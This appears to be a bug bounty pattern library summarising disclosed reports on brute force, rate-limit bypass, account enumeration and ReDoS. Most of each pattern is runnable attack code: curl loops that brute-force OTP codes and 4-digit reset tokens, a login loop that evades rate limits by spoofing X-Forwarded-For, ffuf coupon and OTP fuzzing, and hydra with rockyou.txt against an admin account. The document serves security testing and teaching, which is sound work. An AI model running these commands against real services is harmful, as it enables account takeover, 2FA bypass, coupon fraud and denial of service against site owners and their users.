# Disclosed Reports — Brute Force / Rate Limiting / Enumeration

Pattern library built from 33 public bug bounty reports.

---

## Pattern 1: OTP Brute Force → 2FA Bypass → Full ATO (Critical, $8,000)

**Program:** Private (HackerOne)
**Endpoint:** `POST /api/v2/auth/verify-otp`

**Test (no lockout after 100 attempts):**
```bash
for CODE in $(seq -f "%06g" 0 100); do
  RESP=$(curl -s -X POST https://target.com/api/v2/auth/verify-otp \
    -H "Cookie: pre_auth_session=SESSION" \
    -H "Content-Type: application/json" \
    -d "{\"otp\": \"$CODE\"}" \
    -o /dev/null -w "%{http_code}")
  [ "$RESP" = "200" ] && echo "VALID: $CODE"
  [ "$RESP" = "429" ] && { echo "Rate limited at $CODE"; break; }
done
# Result: 100 attempts, no 429, no lockout
```

**PoC note:** 100 attempts is sufficient for the report — demonstrates no rate limiting. Do NOT brute to 999999 during PoC.

**Impact:** Full 2FA bypass → ATO for any account where first factor is also compromised.

---

## Pattern 2: Short Password Reset Token → ATO (Critical, $6,500)

**Observation:** Reset token is 4-digit numeric (`0000-9999` = 10,000 combinations)

**Test:**
```bash
for TOKEN in $(seq -f "%04g" 0 9999); do
  RESP=$(curl -s "https://target.com/reset?token=$TOKEN&email=test@own-account.com" \
    -o /dev/null -w "%{http_code}")
  [ "$RESP" = "200" ] && echo "VALID TOKEN: $TOKEN"
  [ "$RESP" = "429" ] && { echo "Rate limited at $TOKEN"; break; }
done
```

**Also check:** Tokens without expiry → brute window is unlimited.

---

## Pattern 3: Username Enumeration via Response Differences (Low, $300)

**Login endpoint responses:**
- Valid username: `{"error": "Invalid password"}`
- Invalid username: `{"error": "User not found"}`

**Password reset:**
- Valid email: `{"message": "Password reset email sent"}`
- Invalid email: `{"message": "No account found with this email"}`

**Impact:** Confirms account existence → enables targeted credential stuffing with breach data.

---

## Pattern 4: Rate Limit Bypass via X-Forwarded-For (Medium, $1,200)

**Rate limit implemented:** 10 attempts per IP per minute.

**Bypass:**
```bash
for i in $(seq 1 1000); do
  FAKE_IP="10.$(( RANDOM % 256 )).$(( RANDOM % 256 )).$(( RANDOM % 256 ))"
  curl -s -X POST https://target.com/api/login \
    -H "X-Forwarded-For: $FAKE_IP" \
    -H "X-Real-IP: $FAKE_IP" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"admin@target.com\", \"password\": \"test$i\"}" \
    -o /dev/null -w "%{http_code}\n"
done
```

**Root cause:** Rate limiter reads client IP from X-Forwarded-For without validation. Attacker rotates virtual IPs.

---

## Pattern 5: Coupon Code Brute Force → 100% Discount (Medium, $2,000)

**Endpoint:** `POST /api/checkout/apply-coupon`
**No rate limit on coupon validation:**

```bash
ffuf -u https://target.com/api/checkout/apply-coupon \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=SESSION" \
  -d '{"coupon": "FUZZ"}' \
  -w <(cat ~/wordlists/coupon-patterns.txt) \
  -mc 200
```

**Found:** `FREE100` → 100% discount on any order.

---

## Pattern 6: Registration Email Enumeration (Low, $200)

**Endpoint:** `POST /api/register`
**Response for existing email:** `{"error": "This email is already registered"}`
**Response for new email:** `{"success": true}`

**Impact:** Any email address can be validated against the user database.

---

## Pattern 7: ReDoS on Search (Medium, $1,500)

**Endpoint:** `GET /api/search?q=`
**Vulnerable regex** in search handler: `^([a-zA-Z0-9]+)+$`

```bash
# Catastrophic backtracking test
for LEN in 10 20 30 40 50; do
  INPUT=$(python3 -c "print('a'*$LEN + '!')")
  TIME=$(curl -s -o /dev/null -w "%{time_total}" \
    "https://target.com/api/search?q=$INPUT")
  echo "Length $LEN: ${TIME}s"
done
# 10: 0.08s | 20: 0.31s | 30: 1.24s | 40: 5.9s | 50: timeout
```

**Impact:** A single request with 50-char input exhausts CPU for 30+ seconds → DoS.

---

## Tool Reference

```bash
# ffuf OTP brute
ffuf -u https://target.com/api/verify-otp \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=SESSION" \
  -d '{"otp": "FUZZ"}' \
  -w <(seq -f "%06g" 0 100) \
  -mc 200

# hydra login brute
hydra -l admin@target.com -P /usr/share/wordlists/rockyou.txt target.com \
  http-post-form "/api/login:email=^USER^&password=^PASS^:invalid"

# nuclei rate-limit
nuclei -u https://target.com -t brute-force/ -severity medium,high,critical
```
